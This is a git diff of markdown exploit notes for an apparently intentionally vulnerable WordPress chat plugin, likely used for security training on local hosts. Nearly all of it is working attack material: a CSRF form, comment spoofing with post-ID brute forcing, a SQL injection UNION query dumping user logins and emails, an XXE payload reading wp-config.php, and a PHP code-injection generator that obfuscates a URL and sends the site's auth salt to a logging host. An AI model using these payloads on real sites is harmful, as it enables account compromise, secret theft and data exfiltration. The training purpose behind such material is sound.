@@ -30,16 +30,22 @@ Without Blog Access
 ### CSRF
 
 ```html
-<form enctype="text/plain" action="http://hacek.local/wordpress/wp-admin/admin-ajax.php?action=chatsploit" method="POST">
-	<input type="hidden" name="&lt;chat&gt;" value="Hello&lt;/chat&gt;" />
-	<input type="submit" value="Hot mdawaffe pics!" />
+<form enctype="text/plain" action="http://vip.dev/security/wp-admin/admin-ajax.php?action=chatsploit" method="POST">
+	<input type="hidden" name="&lt;chat&gt;" value="I am lame HAHAHA :)&lt;/chat&gt;" />
+	<input type="submit" value="Click if you like cheese!" />
 </form>
 ```
 
 ### Spoof
 
 ```bash
-curl -i 'http://hacek.local/wordpress/wp-comments-post.php' --form 'comment=Hi' --form 'author=admin' --form 'email=test@example.com' --form 'comment_post_ID=12187'
+curl -i 'http://vip.dev/security/wp-comments-post.php' --form 'comment=I am lame HAHAHA!' --form 'author=admin' --form 'email=test@example.com' --form 'comment_post_ID=5'
+```
+
+Get the `comment_post_ID` from http://vip.dev/security/comments/feed/ or brute force with:
+
+```bash
+curl -i 'http://vip.dev/security/wp-comments-post.php' --form 'author=test' --form 'email=test@example.com' --form "comment_post_ID=$i"
 ```
 
 Get list of all users' email adresses
@@ -51,7 +57,7 @@ With Blog Access
 ### SQL Injection
 
 ```bash
-curl -i 'http://hacek.local/wordpress/wp-admin/admin-ajax.php?action=chatsploit&since=2013-04-18+05:33:47%27+UNION+SELECT+user_login+AS+author%2C+user_email+AS+text%2C+0+AS+time+FROM+wp2_users+--+'
+curl -i 'http://vip.dev/security/wp-admin/admin-ajax.php?action=chatsploit&since=3013-05-14+00:00:00%27+UNION+SELECT+user_login+AS+author%2C+user_email+AS+text%2C+0+AS+time+FROM+wp_users+--+'
 ```
 
 Without Blog Access
@@ -69,12 +75,14 @@ With Blog Access
 
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE xxe [<!ENTITY hi SYSTEM "php://filter/read=convert.base64-encode/resource=file:///Users/mdawaffe/Sites/wp-config.php"> ]>
-<chat>&hi;</chat>
+<!DOCTYPE xxe [<!ENTITY hi SYSTEM "php://filter/read=convert.base64-encode/resource=file:///home/vagrant/www/security/wp-config.php"> ]>
+<chat>Hi! &hi;</chat>
 ```
 
+You can use your own cookies.
+
 ```bash
-cat xxe.xml | curl "http://hacek.local/wordpress/wp-admin/admin-ajax.php?action=chatsploit" -H "Cookie: wordpress_97bd8bf7ee22f9417a72a1ea2e1d6871=author%7C1366426304%7C8fad75c62a8b4bfac050244f094c1084; wordpress_logged_in_97bd8bf7ee22f9417a72a1ea2e1d6871=author%7C1366426304%7C4ae3cc62335b75ef19bb1f812050c654;" --data @-
+cat xxe.xml | curl 'http://vip.dev/security/wp-admin/admin-ajax.php?action=chatsploit' --data @- -H 'Cookie: wordpress_9881e728288c003f340dfcb7f8c7c47c=author%7C1368155849%7Cb2da0569604d7e6bae7fc92758ab4eb7; wordpress_logged_in_9881e728288c003f340dfcb7f8c7c47c=author%7C1368155849%7Ce8138862195324278825dc3751409a14;'
 ```
 
 Without Blog Access
@@ -82,6 +90,7 @@ Without Blog Access
 
 Get blog access first ;)
 
+Or just use the arbitrary code execution vulnerability.
 
 Get the site's SECRET_SALTs
 ===========================
@@ -99,6 +108,24 @@ hello http://example.com/{${substr(chr(97).($a=get_option(chr(97).chr(117).chr(1
 
 ### Without Blog Access
 
+sploit.php:
+```php
+<?php
+
+$log_url = 'http://vip.dev/log.php?';
+
+$encoded_url = '';
+
+for ( $i = 0; $i < strlen( $log_url ); $i++ ) {
+	$encoded_url .= 'chr(' . ord( $log_url[$i] ) . ').';
+}
+
+$sploit = 'hello http://example.com/{${substr(chr(97).($a=' . mt_rand() . ').(file_get_contents(' . $encoded_url . 'urlencode(get_option(chr(97).chr(117).chr(116).chr(104).chr(95).chr(115).chr(97).chr(108).chr(116))))),0,1)}} there';
+
+echo "$sploit\n";
 ```
-hello http://example.com/{${substr(chr(97).(file_get_contents(chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47).chr(104).chr(97).chr(99).chr(101).chr(107).chr(46).chr(108).chr(111).chr(99).chr(97).chr(108).chr(47).chr(116).chr(101).chr(115).chr(116).chr(47).chr(108).chr(111).chr(103).chr(46).chr(112).chr(104).chr(112).chr(63).chr(97).chr(117).chr(116).chr(104).chr(95).chr(115).chr(97).chr(108).chr(116).chr(61).urlencode($a=get_option(chr(97).chr(117).chr(116).chr(104).chr(95).chr(115).chr(97).chr(108).chr(116))))),0,1)}} there
+
+```bash
+curl -i 'http://vip.dev/security/wp-comments-post.php' --form 'author=admin' --form 'email=test@example.com' --form 'comment_post_ID=5' --form "comment=$( php sloit.php )"
+HTTP/1.1 100 Continue
 ```
